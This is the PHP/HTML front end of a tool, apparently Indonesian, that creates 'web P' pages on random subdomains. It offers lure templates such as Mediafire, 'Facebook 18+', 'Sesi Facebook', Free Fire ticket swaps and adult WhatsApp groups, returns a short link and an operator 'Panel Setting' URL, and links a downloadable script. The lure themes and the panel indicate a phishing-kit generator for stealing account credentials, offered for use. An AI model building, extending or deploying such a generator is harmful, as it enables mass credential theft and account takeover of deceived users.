<?php 
include 'AlexShortLink.php';
session_start();
$_SESSION['session'] = bin2hex(random_bytes(32));

function generateRandomSubdomain($length = 8) {
    $characters = 'abcdefghijklmnopqrstuvwxyz0123456789-';
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, strlen($characters) - 1)];
    }
    return $randomString;
}

$subdomain = generateRandomSubdomain();
$domain = $_SERVER['SERVER_NAME'];
$longURL = $domain . '/' . $subdomain;
$zoneId = '6add90ad7cfdabb1cb1296bdb1e28118';
?>
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css">
  <link href="https://fonts.cdnfonts.com/css/common-pixel" rel="stylesheet">
  <title>Buat Web P - Otomatisイチジク</title>
  <style>
    @font-face {
      font-family: 'ibm';
      src: url('https://saweria.co/ibm-plex-mono-latin-400.woff');
    }
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      font-family: 'ibm';
    }
    body {
      width: 100%;
      height: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
      background: #E2E8F0;
    }
.glow {
font-family: 'Common Pixel', sans-serif;
  color: #fff;
  font-size: 25px;
  text-shadow: 0px 0px 10px #000;
}

span {
  display: inline-block;
  padding: 0 10px;
}
    .gateway {
      position: relative;
      max-width: 600px;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .gateway span {
      margin-bottom: 20px;
    }
    .gateway .form {
      position: relative;
      width: 100%;
      display: flex;
      justify-content: center;
      flex-wrap: wrap;
      gap: 10px;
      padding: 0 20px;
    }
    .gateway .response {
      position: relative;
      width: 100%;
      display: none;
      justify-content: center;
      align-items: center;
      flex-direction: column;
      padding: 0 20px;
      margin-top: 30px;
      gap: 10px;
    }
    .response textarea {
      width: 100%;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .form label {
      position: relative;
      width: 100%;
      display: flex;
      flex-direction: column;
    }
    label select, label input {
      width: 100%;
      border: 1px solid #000;
      border-radius: 5px;
      height: 30px;
      padding-left: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
    }
    *:focus {
      outline: none;
    }
    h1 {
            font-family: 'Minecraft', sans-serif;
            color: linear-gradient(-45deg, #ee7752, #e73c7e, #23a6d5, #23d5ab);
            line-height: 25px;
        }
        h1 strong {
            font-size: 2em;
        }
    .form button {
      padding: 5px 10px;
      margin-top: 10px;
      background: #faae2b;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    .gateway .source {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: #25D366;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    footer {
      width: 100%;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .scode {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      background: #fff;
      height: 100%;
      z-index: 9999;
      display: none;
      align-items: center;
      justify-content: center;
      flex-direction: column;
      padding: 10px;
    }
    .scode textarea {
      margin-top: 20px;
      width: 100%;
      height: 100%;
      padding-left: 5px;
      border-radius: 5px;
      background: #A0AEC0;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
    }
    .scode i {
      position: fixed;
      top: 5px;
      right: 10px;
      padding: 5px 10px;
      margin-top: 10px;
      background: pink;
      box-shadow: 0.4rem 0.4rem 0 #222;
      border: 1px solid #000;
      border-radius: 3px;
    }
    #copyButton {
        position: absolute;
        top: 10px;
        right: 10px;
        padding: 5px 10px;
        background-color: #faae2b;
        border: 1px solid #000;
        border-radius: 3px;
        cursor: pointer;
    }
    .rainbow-text .char { 
  
  color: hsl(
    calc(360deg * var(--char-percent)
    ), 
    90%, 
    65%
  );
 
}
#heh {
font-family: 'Common Pixel', sans-serif;
font-size: 50px;
color:#FF0000;
text-shadow: 0px 0px 10px #f00;
}
  </style>
</head>
<body>
<div class="gateway">
  <div href="https://raw.githubusercontent.com/Hyuu09/CDNsalz/main/scriptcreate.zip" class="source">Download Script</div>
  <div id="loading">    CREATE WEB P    </div>
  <br>
  <div class="form">
    <label> TAMPILAN
      <select class="aq" id="tampilan">
        <option selected disabled>Pilih terlebih dahulu...</option>
          <option value="tamp1">DoodStream</option>
          <option value="tamp2">Mediafire MP4</option>
          <option value="tamp3">Mediafire Rege</option>
          <option value="tamp4">Download Apk Bokep</option>
          <option value="tamp5">Video 18+</option>
          <option value="tamp6">Messenger Grup</option>
          <option value="tamp7">Turnamen FF</option>
          <option value="tamp8">Facebook 18+</option>
          <option value="tamp9">SfileMobi 18+</option>
          <option value="tamp10">Nonton Video</option>
          <option value="tamp11">Sesi Facebook</option>
          <option value="tamp12">FF Tukar Tiket</option>
          <option value="tamp13">Grup Wa 18</option>
          <option value="tamp14">Bigo Live</option>
          <option value="tamp15">SafeFileku</option>
      </select>
    </label>
    <label> SUBDOMAIN
      <input name="subdomain" id="subdomain" type="text" class="playerid form-input" value="<?= $longURL ?>" readonly>
    </label>
    <button name="submit" id="btn">submit</button>
  </div>
  <div class="response">
    <span>Response</span>
    <textarea id="responseTextArea" rows='8' readonly></textarea>
    <button id="copyButton"><i class="fa fa-copy"></i> Salin</button>  
  </div>
</div>
<footer>
  Created By <a href="https://yandex.com" style="text-decoration: none;margin: 0 10px"> SalzzXNXx </a> With <img width="20" height="20" src="https://cdn.icon-icons.com/icons2/2699/PNG/512/expressjs_logo_icon_169185.png" style="margin-left: 10px">
</footer>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script>
$(document).ready(function() {
    $("#btn").click(function() {
        var domainValue = $("#subdomain").val();
        var selectedValue = $("#tampilan").val();

        var button = $("#btn");
        button.html('Mengirim <i class="fa fa-spinner fa-spin"></i>');
        button.prop('disabled', true);

        var responseText = "(JANGAN SAMPAI HILANG)\n\n";
        responseText += "Domain:\n<?= $shortenedURL ?>\n";
        responseText += "Panel Setting:\nhttps://<?= $longURL ?>/AlexHostX.php\n";
        responseText += "Tanggal Pembuatan:\n" + new Date().toLocaleDateString();

        $("#responseTextArea").val(responseText);
        $("#copyButton").css("display", "block");

        setTimeout(function() {
            $(".response").css("display", "block");
            button.html('submit');
            button.prop('disabled', false);
        }, 2000);

        if(selectedValue === "tamp1") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('1') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp2") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('2') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp3") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('3') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp4") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('4') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp5") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('5') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp6") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('6') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp7") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('7') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp8") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('8') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp9") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('9') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp10") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('10') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);
    } else if(selectedValue === "tamp11") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('11') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params);    
    } else if(selectedValue === "tamp12") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('12') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp13") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('13') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp14") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('14') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    } else if(selectedValue === "tamp15") {
      var url = "tambahweb.php";
      var params = "nomor=" + encodeURIComponent('15') + "&subdo=" + encodeURIComponent('<?= $subdomain ?>') + "&prosesbuat=" + encodeURIComponent('SalzBjir');
      sendRequest(url, params); 
    }
});

    $("#responseTextArea").blur(function() {
        $("#copyButton").css("display", "none");
    });

    function sendRequest(url, params) {
        $.post(url, params, function(data, status) {
            console.log("Respon dari server:", data);
        });
    }

    $("#copyButton").click(function() {
        var textarea = $("#responseTextArea");
        textarea.select();
        document.execCommand("copy");
        alert("Teks berhasil disalin!");
    });

    let status = "hide";

    function toggleSource() {
        let element = $(".scode");

        if (status == "hide") {
            element.css("display", "flex");
            status = "show";
        } else {
            element.css("display", "none");
            status = "hide";
        }
    }
});
</script>
  <script>
  alphabet = new Array("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V", "W", "X", "Y", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9", "0");
letter_count = 0;
el = $("#loading");
word = el.html().trim();
finished = false;

el.html("");
for (var i = 0; i < word.length; i++) {
  el.append("<span>"+word.charAt(i)+"</span>");
}

setTimeout(write, 75);
incrementer = setTimeout(inc, 1000);

function write() {
  for (var i = letter_count; i < word.length; i++) {
    var c = Math.floor(Math.random() * 36);
    $("span")[i].innerHTML = alphabet[c];
  }
  if (!finished) {
    setTimeout(write, 75);
  }
}

function inc() {
  $("span")[letter_count].innerHTML = word[letter_count];
  $("span:eq("+letter_count+")").addClass("glow");
  letter_count++;
  if (letter_count >= word.length) {
    finished = true;
    setTimeout(reset, 1500);
  } else {
    setTimeout(inc, 100);
  }
}
function reset() {
  letter_count = 0;
  finished = false;
  setTimeout(inc, 1000);
  setTimeout(write, 75);
  $("span").removeClass("glow");
}
  </script>
</body>
</html>